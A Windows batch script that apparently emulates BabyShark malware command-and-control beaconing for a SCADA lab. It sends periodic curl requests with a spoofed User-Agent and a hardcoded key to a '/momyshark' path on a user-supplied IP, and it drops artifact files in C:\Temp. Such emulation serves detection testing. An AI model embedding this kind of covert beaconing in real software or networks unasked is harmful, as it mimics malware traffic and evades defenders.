@echo off
setlocal ENABLEEXTENSIONS

echo === BabyShark CPSDR Simulation (Windows Batch) ===

set /p C2_IP=Enter target IP (e.g., SCADA VM IP):
set /p SECRET_KEY=Enter secret key [default: b4bysh4rk]:
if "%SECRET_KEY%"=="" set SECRET_KEY=b4bysh4rk

set /p USER_AGENT=Enter User-Agent [default: Mozilla/5.0...Chrome/70]:
if "%USER_AGENT%"=="" set USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36

set /p INTERVAL=Enter beacon interval in seconds [default: 10]:
if "%INTERVAL%"=="" set INTERVAL=10

set INPUT_FILE=C:\Temp\input.txt
set OUTPUT_FILE=C:\Temp\output.txt

echo [*] Creating file artifacts at C:\Temp...
if not exist C:\Temp mkdir C:\Temp
echo Simulated command input > "%INPUT_FILE%"
type nul > "%OUTPUT_FILE%"

echo [*] Starting C2 simulation. Press Ctrl+C to stop.
:loop
REM Simulate data transformation
setlocal ENABLEDELAYEDEXPANSION
for /f "usebackq delims=" %%A in ("%INPUT_FILE%") do (
    set "line=%%A"
    echo !line! | powershell -Command "$input.ToUpper()" > "%OUTPUT_FILE%"
)

REM Simulate HTTP beacon (requires curl.exe on Windows 10+)
curl -s -A "%USER_AGENT%" "http://%C2_IP%/momyshark?key=%SECRET_KEY%" >nul

timeout /t %INTERVAL% >nul
endlocal
goto loop
